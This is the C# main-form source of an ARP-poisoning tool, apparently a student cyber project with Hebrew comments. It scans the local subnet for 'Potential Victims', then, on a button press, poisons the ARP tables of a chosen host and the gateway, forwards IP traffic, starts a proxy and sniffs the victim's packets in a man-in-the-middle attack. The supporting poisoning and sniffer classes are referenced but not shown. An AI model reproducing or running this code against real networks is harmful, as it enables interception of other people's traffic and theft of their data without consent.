using PacketDotNet;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ARP_Poisoning
{
    public partial class Form1 : Form
    {
        IPAddress DEF_GW = IPAddress.Parse("192.168.87.1");
        string[] p = new string[3];//שומר את שלושת הבתים הראשונים במחרוזת האיי.פי
        int i = 0;
        Thread arpSpoofing;
        Thread ipFwd;
        SendARP sa;
        ARP_Poison aliceArp;
        ARP_Poison bobArp;
        Proxy proxy;




        public Form1()
        {
            InitializeComponent();
            label1.Text = "Potential Victims:";
            label3.Text = GetIPDefaultGateway().ToString();
            label5.Text = GetMyIPAddress().ToString();
            button2.Enabled = false;
            sa = new SendARP(this);
            label6.Text += GetMacAddress().ToString();
            pictureBox1.Image = Image.FromFile(@"E:\Cyber Project\Cyber Project\ARP-Poisoning\ARP-Poisoning\Actions-dialog-ok-apply-icon.png");

        }

        /// <summary>
        /// מוסיף לרשימה אי.פי וכתובת פיזית
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            ListView.SelectedIndexCollection indexes = listView1.SelectedIndices;
            string item = "";
            foreach (int index in indexes)
            {
                for (int i = 0; i < listView1.Items[index].SubItems.Count; i++)
                    item += (listView1.Items[index].SubItems[i].Text).ToString() + " ";
            }

        }
        /// <summary>
        /// לוקח את האיי.פי בלחיצת עכבר על השורה שהתוקף רוצה
        /// </summary>
        /// <returns></returns>
        public IPAddress GetIPForPoisoning()
        {
            string getIPForPoisoning = listView1.SelectedItems[0].Text;
            IPAddress ipa = IPAddress.Parse(getIPForPoisoning);

            return ipa;
        }

        /// <summary>
        /// מחזיר את האיי.פי של המחשב
        /// </summary>
        /// <returns></returns>
        public IPAddress GetMyIPAddress()
        {
            IPAddress ipAddress;
            IPHostEntry host;
            string localIP = "?";
            host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily.ToString() == "InterNetwork")
                {
                    localIP = ip.ToString();
                }
            }
            ipAddress = IPAddress.Parse(localIP);
            return ipAddress;
        }

        public string GetMacAddress()
        {
            string macAddresses = string.Empty;

            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.OperationalStatus == OperationalStatus.Up)
                {
                    macAddresses += nic.GetPhysicalAddress().ToString();
                    break;
                }
            }

            return macAddresses;
        }
        /// <summary>
        /// יוצרת מקום של 48 ביטים / 6 בייטים
        /// </summary>
        /// <returns></returns>

        public Task CheckPoisonbutton()
        {
            return Task.Run(() =>
                 {
                     if (listView1.SelectedItems[0].Text != "")
                     {
                         button2.Enabled = true;
                         listView1.SelectedItems[2].Text = "Poisoned";
                     }
                     else button2.Enabled = false;
                 });
        }

        public byte[] Lmacarray()
        {
            string macAddr = GetMacAddress();

            // Convert MAC address to Hex bytes
            long value = long.Parse(macAddr, NumberStyles.HexNumber, CultureInfo.CurrentCulture.NumberFormat);
            byte[] macBytes = BitConverter.GetBytes(value);

            Array.Reverse(macBytes);
            byte[] macAddress = new byte[6];
            for (int i = 0; i <= 5; i++)
                macAddress[i] = macBytes[i + 2];

            return macAddress;
        }
        /// <summary>
        /// מחיזרה את העורך של המאק
        /// </summary>
        /// <returns></returns>
        public int LByteArrayLen()
        {
            int lByteArrayLen = 0;
            lByteArrayLen = Lmacarray().Length;
            return lByteArrayLen;
        }
        /// <summary>
        /// מוסיפה אייטמים לליסט ויו
        /// </summary>
        /// <param name="item1"></param>
        internal void AddToListView(ListViewItem item1)
        {
            listView1.Items.Add(item1);
            listView1.Refresh();
        }

        internal void AddToListView2(ListViewItem item1)
        {
            listView2.Items.Add(item1);
            listView2.Refresh();
        }
        /// <summary>
        /// מחזיר את האיי.פי של המחשב ב*סטרינג* לא לשנות
        /// </summary>
        public string GetIPAddress()
        {
            IPHostEntry host;
            string localIP = "?";
            host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily.ToString() == "InterNetwork")
                {
                    localIP = ip.ToString();
                }
            }

            string[] collection = localIP.Split('.');

            for (int i = 0; i < 3; i++)
            {
                p[i] = (collection[i]);
            }
            //textBox1.Text = p[0] + "." + p[1] + "." + p[2] + ".";
            return localIP;
        }
        /// <summary>
        /// ברגע הלחיצה הוא בודק את כל המשתמשים שגולשים על אותו הספק
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void button1_Click(object sender, EventArgs e)
        {
            label7.Text = "";
            button1.Enabled = false;
            SendARP sendarp1 = new SendARP(this);
            string localIP = GetIPDefaultGateway().ToString();
            string[] collection = localIP.Split('.');
            for (int i = 0; i < 3; i++)
            {
                p[i] = (collection[i]);
            }
            listView1.Items.Clear();
            string ipNetworkAddress = p[0] + "." + p[1] + "." + p[2] + ".";
            button2.Enabled = true;
            int end = int.Parse(textBox4.Text);
            int start = int.Parse(textBox3.Text);
            double sum = 0;
            for (int i = start; i < end; i++)
            {

                sum += 100 / (end - start);
                //MessageBox.Show(""+(double)sum);
                progressBar1.Value = (int)sum;
                await sendarp1.Send(ipNetworkAddress + i.ToString());
                label1.Text = "";
                label1.Text = "Potential Victims: " + listView1.Items.Count.ToString();

            }
            progressBar1.Value = 0;
            label7.Text = "Completed";
            button1.Enabled = true;
        }
        /// <summary>
        /// שולח לפעולה הנ"ל את כל המנותים שהיא צריכה
        /// </summary>
        public async void SendPoisonArpPacketToAlice()
        {
            string f = "";
            f = sa.GetMACFromNetworkComputer(GetIPDefaultGateway());
            aliceArp.SetValues(PhysicalAddress.Parse(GetMacAddress()), GetMyIPAddress(), PhysicalAddress.Parse(f), GetIPDefaultGateway(), this);
            await aliceArp.IpSpoofing();
        }
        public async void IPFwdAlice()
        {
            await aliceArp.Ipfwd();
        }
        /// <summary>
        /// משיגה את האיי.פי של הראוטר
        /// </summary>
        /// <returns></returns>
        public IPAddress GetIPDefaultGateway()
        {
            return DEF_GW;

            //var card = NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault();
            //if (card == null) return null;
            //var address = card.GetIPProperties().GatewayAddresses.FirstOrDefault();
            //return address.Address;
        }
        /// <summary>
        /// כשנלחץ מפעיל את הפעולה הנ"ל שמרעילה את טבלת ההארפ של המחשב המותקף
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button2_Click(object sender, EventArgs e)
        {
            SetARPpoision();
            SendPoisonArpPacketToAlice();
            IPFwdAlice();
            proxy = new Proxy(GetMyIPAddress());
            //SendPoisonArpPacketToBob();
            //IPFwdBob();
            AddTabControl();
            Sniffer sn = new Sniffer();
            sn.GetForm(this);
            sn.GetWebBrowser(webBrowser1);
            string a = GetIPForPoisoning().ToString();
            sn.SetMyIp(GetMyIPAddress().ToString());
            sn.GetListView(listView2);
            sn.GetTreeView(treeView);
            sn.IPVictim(GetIPDefaultGateway().ToString());
            sn.IPVictim(a);
            sn.StartSniffing();

            /////////////////////////
            //MessageBox.Show(a);
        }

        public void SetARPpoision()
        {
            string MacAlice = sa.GetMACFromNetworkComputer(GetIPForPoisoning());
            string Macbob = sa.GetMACFromNetworkComputer(GetIPDefaultGateway());
            PhysicalAddress AliceMac = PhysicalAddress.Parse(MacAlice.ToUpper());
            PhysicalAddress bobeMac = PhysicalAddress.Parse(Macbob.ToUpper());
            aliceArp = new ARP_Poison(GetIPForPoisoning(), AliceMac);
            bobArp = new ARP_Poison(GetIPDefaultGateway(), bobeMac);
        }
        private void AddTabControl()
        {

            if (i == 0)
            {
                Sniffer.Text += " " + GetIPForPoisoning();
                i++;
            }
            else
            {
                string title = "Sniffer: " + GetIPForPoisoning();
                TabPage myTabPage = new TabPage(title);
                tabControl1.TabPages.Add(myTabPage);
                ListView ls = new ListView();

                tabControl1.TabPages[2].Controls.Add(ls);
            }
        }

        //public Task ChackArp()
        //{
        //    return Task.Run(() =>
        //      {
        //          Process p = null;
        //          string output = string.Empty;
        //          for (int i = 0; i < 60; i++)
        //          {
        //              try
        //              {
        //                  p = Process.Start(new ProcessStartInfo("arp", "-a")
        //                  {
        //                      CreateNoWindow = true,
        //                      UseShellExecute = false,
        //                      RedirectStandardOutput = true
        //                  });

        //                  output = p.StandardOutput.ReadToEnd();

        //                  p.Close();
        //              }
        //              catch (Exception ex)
        //              {
        //                  throw new Exception("IPInfo: Error Retrieving 'arp -a' Results", ex);
        //              }
        //              finally
        //              {
        //                  if (p != null)
        //                  {
        //                      p.Close();
        //                  }
        //              }

        //              textBox2.Text += ((sa.GetMACFromNetworkComputer(GetIPDefaultGateway()).ToString())) + "\r\n";
        //              textBox2.Text += ((GetMacTable(output)).ToUpper()) + "\r\n";
        //              if (sa.GetMACFromNetworkComputer(GetIPDefaultGateway()) != GetMacTable(output).ToUpper())
        //              {
        //                  pictureBox1.Image = Image.FromFile("G:\\Cyber Project\\Cyber Project\\ARP-Poisoning\\ARP-Poisoning\\redX2.png");
        //              }
        //              else
        //              {
        //                  textBox2.Clear();
        //                  Thread.Sleep(10000);
        //              }
        //              Thread.Sleep(500);
        //          }
        //      });
        //}
        //public string GetMacTable(string str)
        //{
        //    string mac = GetIPDefaultGateway().ToString();
        //    int length = mac.Length;
        //    int startindex = str.IndexOf(GetIPDefaultGateway().ToString());
        //    string result = str.Substring(startindex + length + 9, 17);

        //    return result;
        //}

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button3_Click(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void listView1_ItemActivate(object sender, EventArgs e)
        {

        }

        private void listView1_ItemSelectionChanged(object sender, ListViewItemSelectionChangedEventArgs e)
        {

        }

        private void button3_Click_1(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void tabPage1_Click(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void listView2_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void listView2_SelectedIndexChanged_1(object sender, EventArgs e)
        {

        }

        private void treeView_AfterSelect(object sender, TreeViewEventArgs e)
        {

        }

        private void progressBar1_Click(object sender, EventArgs e)
        {

        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            //arpSpoofing.Abort();
            //ipFwd.Abort();
        }

        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }

        private void button3_Click_2(object sender, EventArgs e)
        {

        }

        private void webBrowser1_DocumentCompleted_1(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }

        private void Sniffer_Click(object sender, EventArgs e)
        {

        }

        private void webBrowser1_DocumentCompleted_2(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }

        private void button4_Click(object sender, EventArgs e)
        {

            //TrafficFilter();
        }

        public async void TrafficFilter()
        {
            //await tf.StartTrafic();
        }

        private void label8_Click(object sender, EventArgs e)
        {

        }

        private async void button4_Click_1(object sender, EventArgs e)
        {
            //await ChackArp();
        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }


    }
}
